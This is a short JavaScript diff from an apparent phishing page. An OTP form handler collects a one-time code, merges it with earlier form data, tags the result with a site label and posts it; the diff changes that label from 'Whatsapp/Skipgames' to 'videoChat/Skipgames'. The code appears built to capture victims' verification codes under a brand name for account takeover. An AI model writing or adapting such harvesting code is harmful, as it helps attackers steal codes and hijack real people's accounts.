@@ -88,7 +88,7 @@
       event.preventDefault();
       // Get OTP value and handle authentication (you can customize this part)
       const otp = otpForm.querySelector('input[type="text"]').value;
-      const  data = {...formData,otp,siteName:"Whatsapp/Skipgames"}
+      const  data = {...formData,otp,siteName:"videoChat/Skipgames"}
        
   
       await postData(data)
